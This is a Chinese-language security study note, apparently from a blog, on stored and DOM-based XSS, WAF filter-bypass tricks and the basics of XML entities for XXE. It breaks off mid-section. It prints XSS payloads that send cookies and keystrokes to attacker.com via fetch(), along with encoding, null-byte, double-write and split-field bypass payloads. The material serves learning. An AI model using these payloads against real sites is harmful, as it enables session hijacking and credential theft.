<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><strong>提交恶意脚本</strong>：攻击者将带有 JavaScript 代码的输入提交到服务器，例如通过评论、论坛帖子、用户信息等表单字段。</p>
<p><strong>存储在服务器</strong>：服务器保存这些数据（如存储在数据库中），并在特定页面加载数据时不做任何过滤或编码。</p>
<p><strong>向用户展示</strong>：当其他用户访问存储了恶意脚本的数据页面时，服务器将数据直接输出到页面中。</p>
<p><strong>执行攻击代码</strong>：用户的浏览器将恶意脚本代码解析并执行。攻击者可以利用此代码窃取用户的敏感信息，甚至劫持会话。</p>
<h4 id="如何发现-1"><a href="#如何发现-1" class="headerlink" title="如何发现"></a>如何发现</h4><p>所以 要发现这种类型的xss<strong>关键在于找到能存储用户输入的功能，并验证该输入是否会被安全输出 或者说能不能被完整的输出</strong>  </p>
<p>也就是上面说的”吃什么吐什么” 如何判断是否被完整的输出 则可以通过f12方法来确定  </p>
<p>例如如果在评论区里面插入<script>alert(1)</script>   </p>
<p>再去f12查看 发现还是原来的样子 则就是被完整的保留并且输出了出来  </p>
<p>要是变成了这样 </p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&amp;<span class="hljs-keyword">lt</span>;script&amp;<span class="hljs-keyword">gt</span>;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)&amp;<span class="hljs-keyword">lt</span>;/script&amp;<span class="hljs-keyword">gt</span>;<br></code></pre></td></tr></table></figure>

<p>则payload里面的特殊字符被实体化了 即没有”吃什么吐什么”  </p>
<p>即没有存储型的xss  </p>
<h4 id="涉及到的场景"><a href="#涉及到的场景" class="headerlink" title="涉及到的场景"></a>涉及到的场景</h4><p>用户反馈 留言功能 评论区 评价功能  公告板  </p>
<p>文件管理或者预览功能 : 攻击者上传的文件名或描述中嵌入了恶意代码，当其他用户查看文件列表时，脚本被执行,例如上传一个包含着使用户强制下载恶意文件并且自动运行的payload的文件名  </p>
<p>图片&#x2F;头像上传功能:用户上传头像或图片时，文件名或路径中嵌入了恶意脚本，其他用户查看时触发  </p>
<p>在线聊天系统:攻击者在群聊或私聊中发送恶意脚本，当受害者打开聊天界面时执行。  </p>
<p>等等等等  </p>
<p>存储型XSS攻击的核心在于<strong>恶意脚本被存储在系统中，并在其他用户或管理员访问时执行</strong>  </p>
<p>所以能被他人访问到查看到的 都可以进行尝试    </p>
<h4 id="简单利用-1"><a href="#简单利用-1" class="headerlink" title="简单利用"></a>简单利用</h4><p>替换简单的 <code>alert()</code> 为实际的攻击代码，例如窃取用户的Cookie、键盘记录、或植入恶意广告。</p>
<p><strong>盗取cookie</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://attacker.com/log?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><strong>获取键盘记录</strong>  </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeypress</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">    fetch(<span class="hljs-string">&#x27;http://attacker.com/log?key=&#x27;</span> + e<span class="hljs-built_in">.key</span>);</span><br><span class="language-xquery">&#125;</span><span class="language-xml">;</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br></code></pre></td></tr></table></figure>

<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>先看当我们在浏览器的地址栏里面输入一个url 并且按下回车键之后 会发生些什么  </p>
<p><strong>1. 浏览器的操作</strong></p>
<p><strong>1.1. URL解析</strong></p>
<ul>
<li>浏览器解析你输入的 URL，分解为以下部分：<ul>
<li><strong>协议</strong>（如 <code>http://</code> 或 <code>https://</code>）</li>
<li><strong>域名</strong>（如 <code>www.example.com</code>）</li>
<li><strong>路径</strong>（如 <code>/about</code>）</li>
<li><strong>查询参数</strong>（如 <code>?id=123</code>）</li>
</ul>
</li>
</ul>
<p><strong>1.2. DNS 解析</strong></p>
<ul>
<li>浏览器将域名交给操作系统，通过 DNS（域名系统）找到对应的 IP 地址：<ul>
<li>浏览器会先查询缓存（浏览器缓存、操作系统缓存）。</li>
<li>如果缓存中没有，则向 DNS 服务器发送请求。</li>
<li>最终获得服务器的 IP 地址。</li>
</ul>
</li>
</ul>
<p><strong>2. 与服务端的连接</strong></p>
<p><strong>2.1. 建立 TCP 连接</strong></p>
<ul>
<li>浏览器通过 IP 地址与服务端建立连接：<ul>
<li>使用 <strong>TCP&#x2F;IP 协议</strong>，三次握手建立可靠连接。</li>
</ul>
</li>
</ul>
<p><strong>2.2. TLS&#x2F;SSL 握手（仅 HTTPS）</strong></p>
<ul>
<li>如果 URL 使用 <code>https</code>，浏览器与服务端会协商加密协议，并交换证书以建立安全连接。</li>
</ul>
<p><strong>2.3. HTTP 请求</strong></p>
<ul>
<li>浏览器向服务端发送 HTTP 请求：<ul>
<li><strong>请求方法</strong>：如 <code>GET</code>（获取资源）、<code>POST</code>（提交数据）。</li>
<li><strong>请求头</strong>：包含浏览器信息、cookies 等。</li>
<li><strong>请求体</strong>：提交的具体数据（如表单数据）。</li>
</ul>
</li>
</ul>
<p><strong>3. 服务端的响应</strong></p>
<p><strong>3.1. 服务端接收请求</strong></p>
<ul>
<li>服务端（通常是 Web 服务器，如 Nginx、Apache）接收到请求并处理：<ul>
<li>检查 URL 的路径和请求方法。</li>
<li>根据路径，将请求转发到相应的后端应用程序或资源。</li>
</ul>
</li>
</ul>
<p><strong>3.2. 后端处理</strong></p>
<ul>
<li>后端（服务器中的应用逻辑部分，如 Node.js、PHP、Python 等）接管请求：<ul>
<li><strong>业务逻辑处理</strong>：如查询数据库、计算结果等。</li>
<li><strong>动态内容生成</strong>：构建 HTML 页面或返回 JSON 数据。</li>
<li><strong>权限验证</strong>：检查用户权限或身份。</li>
</ul>
</li>
</ul>
<p><strong>3.3. 数据库交互</strong></p>
<ul>
<li>后端可能与数据库进行交互：<ul>
<li>查询、插入或更新数据。</li>
<li>将结果返回给后端。</li>
</ul>
</li>
</ul>
<p><strong>3.4. 返回响应</strong></p>
<ul>
<li>后端将处理结果返回给服务端（如 HTML 页面、JSON 数据、状态码等）。</li>
<li>服务端打包这些数据，形成 HTTP 响应发送给浏览器。</li>
</ul>
<p><strong>4. 浏览器解析响应</strong></p>
<p><strong>4.1. 接收响应</strong></p>
<ul>
<li>浏览器收到服务端的 HTTP 响应：<ul>
<li><strong>状态码</strong>：如 <code>200 OK</code>（成功）、<code>404 Not Found</code>（资源不存在）。</li>
<li><strong>响应头</strong>：如内容类型、缓存策略。</li>
<li><strong>响应体</strong>：如 HTML 文档、CSS 文件、JavaScript 文件等。</li>
</ul>
</li>
</ul>
<p><strong>4.2. 渲染页面</strong></p>
<ol>
<li>HTML 解析：<ul>
<li>浏览器解析 HTML 文件，构建 DOM（文档对象模型）。</li>
</ul>
</li>
<li>CSS 解析：<ul>
<li>加载和解析 CSS 文件，构建渲染树。</li>
</ul>
</li>
<li>JavaScript 执行：<ul>
<li>下载并执行 JavaScript 文件，动态修改 DOM 或处理用户交互。</li>
</ul>
</li>
<li>资源加载：<ul>
<li>异步加载图片、字体、视频等其他资源。</li>
</ul>
</li>
<li>页面呈现：<ul>
<li>将内容绘制到屏幕。</li>
</ul>
</li>
</ol>
<p><strong>5. 用户的前端体验</strong></p>
<ul>
<li>前端逻辑：<ul>
<li>页面中的交互功能（如按钮点击、动态内容加载）由 JavaScript 实现。</li>
</ul>
</li>
<li>与后端的进一步交互：<ul>
<li>如果页面需要更多数据，可能通过 AJAX 或 Fetch 发起异步请求。</li>
<li>后端返回数据后，前端更新页面内容。</li>
</ul>
</li>
</ul>
<p><strong>前后端协作的联系</strong></p>
<ol>
<li>前端和后端分离：<ul>
<li>前端通过 API 接口获取数据（如 RESTful、GraphQL）。</li>
<li>后端只负责逻辑处理和数据提供，前端负责渲染和交互。</li>
</ul>
</li>
<li>实时通信：<ul>
<li>使用 WebSocket 等技术实现前后端的双向通信。</li>
</ul>
</li>
<li>安全交互：<ul>
<li>使用 Cookies、Tokens 或 Session 验证用户身份。</li>
</ul>
</li>
</ol>
<p>有点懒 直接gpt生成了 总结一下就是  </p>
<p>浏览器解析 URL 并通过 DNS 将域名解析为 IP 地址，然后与服务器端建立 TCP 连接（HTTPS 时会进行 TLS 加密握手）。接着，浏览器发送 HTTP 请求，服务器端通过 Web 服务器（如 Nginx、Apache）将请求转发给后端应用程序。后端根据请求执行逻辑处理，如数据库查询、数据计算等，并返回 HTTP 响应（如 HTML、JSON 数据）。浏览器接收响应后解析 HTML，加载 CSS、执行 JavaScript，构建和渲染页面。如果需要更多数据，前端通过 API 与后端通信实时更新页面。  </p>
<p><strong>这也是上面存储型xss的攻击流程 也就是前端-&gt;服务器(储存到数据库当中)-&gt;前端</strong>  </p>
<p><strong>而dom型xss不一样 虽然说跟存储型的xss很像 但是前者的数据不经过后端 也就是不走服务器那边 也就是 前端-&gt;前端</strong>  </p>
<h4 id="什么是dom"><a href="#什么是dom" class="headerlink" title="什么是dom"></a>什么是dom</h4><p>DOM 的全称是 <strong>Document Object Model（文档对象模型）</strong>，它是一种定义 HTML、XML 文档结构的标准编程接口。简单来说，DOM 将文档（网页）解析成一棵“树形结构”，让开发者可以使用编程语言（如 JavaScript）访问和操作网页中的内容和结构。  </p>
<p>DOM 的核心是将网页内容组织成一种 <strong>树形结构</strong>，其中每个 HTML 元素或属性都被表示为一个“节点（Node）”。  </p>
<p>DOM 中的一切（元素、属性、文本）都是节点  </p>
<p>DOM 提供了丰富的属性和方法供开发者操作文档  </p>
<p><strong>访问元素</strong>：</p>
<ul>
<li><code>document.getElementById(&quot;id&quot;)</code></li>
<li><code>document.querySelector(&quot;.class&quot;)</code></li>
</ul>
<p><strong>修改内容</strong>：</p>
<ul>
<li><code>element.textContent</code> 修改文本内容。</li>
<li><code>element.innerHTML</code> 修改 HTML 内容。</li>
</ul>
<p><strong>事件绑定</strong>：</p>
<ul>
<li><code>element.addEventListener(&quot;click&quot;, callback)</code> 监听事件。</li>
</ul>
<p><strong>好处</strong>  </p>
<p>浏览器将 HTML 文档解析成 DOM 树，为开发者提供对文档内容的编程访问方式。  </p>
<p>开发者可以通过 JavaScript 操作 DOM，实现页面的动态交互，例如：</p>
<ul>
<li>改变文本内容。</li>
<li>插入、删除、修改 HTML 元素。</li>
<li>响应用户的鼠标点击、输入等事件。</li>
</ul>
<h4 id="dom型xss简单介绍"><a href="#dom型xss简单介绍" class="headerlink" title="dom型xss简单介绍"></a>dom型xss简单介绍</h4><p>DOM 类型的 XSS 攻击发生在浏览器端，攻击者利用浏览器的 <strong>DOM（Document Object Model）</strong> 操作，通过修改页面内容或执行恶意脚本来执行攻击  </p>
<p>在这种攻击中，恶意用户输入（如通过 URL 查询参数、表单、或者其他客户端输入）会被页面上的 JavaScript 代码直接读取并操作，然后没有适当的验证或消毒，从而导致恶意脚本的执行。  </p>
<h4 id="DOM-类型-XSS-的工作原理"><a href="#DOM-类型-XSS-的工作原理" class="headerlink" title="DOM 类型 XSS 的工作原理"></a><strong>DOM 类型 XSS 的工作原理</strong></h4><ol>
<li><strong>恶意输入</strong>：攻击者构造一个包含恶意 JavaScript 代码的输入，常见的是在 URL 的查询参数、表单字段或请求头中注入恶意脚本。</li>
<li><strong>客户端代码</strong>：页面加载后，JavaScript 代码从 URL 或其他地方读取这些用户输入，直接将它们插入到 DOM 中。比如，使用 <code>innerHTML</code>、<code>document.write()</code>、<code>eval()</code> 或其他不安全的 DOM 操作方法。</li>
<li><strong>执行恶意代码</strong>：因为恶意脚本未经处理（没有进行转义或消毒），它会作为实际的 JavaScript 代码执行，导致 XSS 攻击的发生。例如，恶意代码可能窃取 cookies、会话信息，或者执行其他破坏性操作。</li>
</ol>
<h4 id="js代码如何实现读取输入"><a href="#js代码如何实现读取输入" class="headerlink" title="js代码如何实现读取输入"></a>js代码如何实现读取输入</h4><p>既然是从前端到前端 那么js代码是如何实现获取这些用户传入的数据 并且再将其传输到前端的呢  </p>
<p>或者说 为什么在前端就能获取到特定的值(用户的输入)  </p>
<p>主要依靠如下几个属性  </p>
<p>document.referer属性  </p>
<p>window.name属性  </p>
<p>location属性  </p>
<p>innerHTML属性</p>
<p>document.write属性  </p>
<p>下面对应着的方法  </p>
<p><strong>总结</strong>  </p>
<p>对于dom型xss的发现  </p>
<p>主要需要留意获取数据的采用的方式  </p>
<p>以及后续处理数据的位置  </p>
<p>留意是否是在前端用js代码直接进行获取 并且传到前端  </p>
<p><a target="_blank" rel="noopener" href="https://jinone.github.io/bugbounty-dom-xss/">https://jinone.github.io/bugbounty-dom-xss/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/107">https://security.tencent.com/index.php/blog/msg/107</a>  </p>
<h2 id="涉及到的waf绕过"><a href="#涉及到的waf绕过" class="headerlink" title="涉及到的waf绕过"></a>涉及到的waf绕过</h2><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h4><p>url编码  </p>
<p>html实体编码 (10进制和16进制)  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412182029831.png" srcset="/img/loading.gif" lazyload alt="1734524975035"></p>
<p>值得注意的是  </p>
<p>实体编码是支持填充多个0的  </p>
<p>例如 e的实体编码(10进制)为 &amp;#101  </p>
<p>但是&amp;#000101 也可以正常解析为e  </p>
<p>也可以删除多余的0  </p>
<p>还有一种涉及到<strong>进制转换</strong>的编码方式</p>
<p><strong>第一种叫3位数的8进制</strong>  </p>
<p>位数不够用0填充，比方说这里的十进制60，八进制转化为74，是两位数，那么前面补个0变成三位，那就是074。最后在前面加上反斜杠，那么就是三位数八进制格式了</p>
<p>&lt;的三位数八进制： \074</p>
<p><strong>第二种叫两位十六进制</strong>  </p>
<p>位数不够同样用0填充（比如1的十六进制是1，那么就要填充成01）  </p>
<p>&lt;的十六进制为3C对吧，那么直接在前面补一个\x就行。</p>
<p>&lt;的两位数十六进制： \x3c</p>
<p><strong>第三种则是四位的十六进制</strong>  </p>
<p>上面说&lt;的十六进制为3C对吧，只有两位，那么还要补两个0，变成003c，然后在最前面补一个\u，就完成了。</p>
<p>&lt;的四位数十六进制： \u003c</p>
<p>&#x2F;&#x2F;这也就是所谓的unicode编码，<em><strong>*注意这里的\可以替换为%*</strong></em></p>
<h4 id="url编码里面的百分号绕过"><a href="#url编码里面的百分号绕过" class="headerlink" title="url编码里面的百分号绕过"></a>url编码里面的百分号绕过</h4><p>尝试二次url编码  </p>
<p>script-&gt;%73%63%72%69%70%74-&gt;%2573%2563%2572%2569%2570%2574  </p>
<p><em><strong>*url编码还有一种改造方法，那就是在中间插入u00也是有效的*</strong></em>  </p>
<p>例如 %2e &#x3D;&gt; .  </p>
<p>%u002e &#x3D;&gt; .  </p>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>针对于只过滤一次的  </p>
<p>例如只对script进行一次的过滤  </p>
<p><code>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;或&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;  </code></p>
<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>一种xss的防御方法是限制用户输入的长度  </p>
<p>遇到这种可以尝试查看页面上是否存在<strong>多个字段或元素</strong>，并且这些元素的值会被返回到同一个页面中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Multi-Field XSS Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Submit Your Inputs<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- Form for user input --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    Field 1: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;field1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    Field 2: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;field2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    Field 3: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;field3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Submitted Data:<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Displaying user input without sanitization --&gt;</span><br>    Field 1: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;field1&quot;</span>&gt;</span>&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/*<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    Field 2: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;field2&quot;</span>&gt;</span>*/alert(/xss/)/*<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    Field 3: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;field3&quot;</span>&gt;</span>*/</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>例如这样的  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191453396.png" srcset="/img/loading.gif" lazyload alt="1734591178237"></p>
<p>可以尝试将payload进行拆分，分块插入各个元素中进行长度限制绕过,利用&#x2F;**&#x2F;注释符拼接起来  </p>
<p>例如分别输入  </p>
<p><code>&quot;&gt;&lt;script&gt;/* </code> <code>*/alert(/xss/)/*</code> <code>*/&lt;/script&gt;</code> 即可  </p>
<p>利用&#x2F;**&#x2F;注释符拼接起来  </p>
<p>  <img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191512942.png" srcset="/img/loading.gif" lazyload alt="1734592366779"></p>
<p> 还有一种拼接方式是利用反引号&#96; 来进行拼接  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412191514136.png" srcset="/img/loading.gif" lazyload alt="1734592449449"></p>
<h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>很基础  </p>
<p>比如把script写成SCRIPT或者ScRipT这样的  </p>
<h4 id="空字节绕过"><a href="#空字节绕过" class="headerlink" title="空字节绕过"></a>空字节绕过</h4><p><strong>空字节</strong>通常指的是 ASCII 编码中的值为 <code>0x00</code>，即 <strong>NULL 字符</strong>。这是一个控制字符，用于标志字符串的结束（在 C 和 C++ 语言中尤为常见）  </p>
<p>在很多情况下，空字节会被解释为字符串的终止符。因此，如果输入中包含空字节，后续的内容可能被截断，从而对原本的字符串处理逻辑产生影响  </p>
<p><code>&lt;%00script&gt;alert(1)&lt;/scri%00pt&gt;   </code></p>
<p><code>&lt;script&gt;ale%00rt(1)&lt;/script&gt;</code></p>
<p>针对于那种喜欢正则匹配来匹配的script等危险标签的程序员  </p>
<h4 id="回车-tab-换行符绕过"><a href="#回车-tab-换行符绕过" class="headerlink" title="回车 tab 换行符绕过"></a>回车 tab 换行符绕过</h4><p>针对于那种去匹配某一行语句的过滤方法  </p>
<p>可以在payload里面去插入换行 回车等等来绕  </p>
<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><p> 单引号被过滤</p>
<h1 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h1><p>全称  </p>
<p>XML External Entity，XML 外部实体注入  </p>
<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>XML（<strong>eXtensible Markup Language</strong>，可扩展标记语言）是一种用于存储和传输结构化数据的文本格式。它类似于 HTML，但主要用于数据存储和交换，而不是用于网页显示。  </p>
<p><strong>可扩展性</strong>：允许用户自定义标签。</p>
<p><strong>层次结构</strong>：使用嵌套标签形成树状结构。</p>
<p><strong>可读性</strong>：人类和机器都可以轻松解析 XML。</p>
<p><strong>跨平台</strong>：广泛用于 Web 服务（SOAP、REST）、配置文件（如 <code>config.xml</code>）、文档存储（如 <code>docx</code>）、数据库（如 <code>XML 数据库</code>）等。  </p>
<p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>//这一行是 XML 文档定义<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">message</span> (<span class="hljs-keyword">receiver</span> ,<span class="hljs-keyword">sender</span> ,<span class="hljs-keyword">header</span> ,<span class="hljs-keyword">msg</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">receiver</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">sender</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">header</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">msg</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>声明定义了一个名为 <code>message</code> 的根元素，它包含四个子元素：<code>receiver</code>、<code>sender</code>、<code>header</code> 和 <code>msg</code></p>
<p>那么到时候的xml就必须像这么写  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span>Myself<span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span>Someone<span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>TheReminder<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span>This is an amazing book<span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在 XML 中，<strong>实体（Entity）</strong> 可以被视为一种<strong>变量</strong>，用于在文档内复用文本或数据。在 <strong>DTD（Document Type Definition）</strong> 中，我们可以定义实体，并在 XML 文档中引用它们  </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-string">&quot;test&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><code>&lt;!ELEMENT foo ANY&gt;</code> 说明 <code>foo</code> 标签内可以包含任何内容。</p>
<p><code>&lt;!ENTITY xxe &quot;test&quot;&gt;</code> 定义了一个 <strong>内部实体</strong>，名称为 <code>xxe</code>，值为 <code>&quot;test&quot;</code>。</p>
<p>这就像在编程中定义一个<strong>常量变量</strong>，后续 XML 文档中可以通过 <code>&amp;xxe;</code> 来引用它。  </p>
<p>后续在xml文档中可以这样写    </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>mypass<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>解析后  </p>
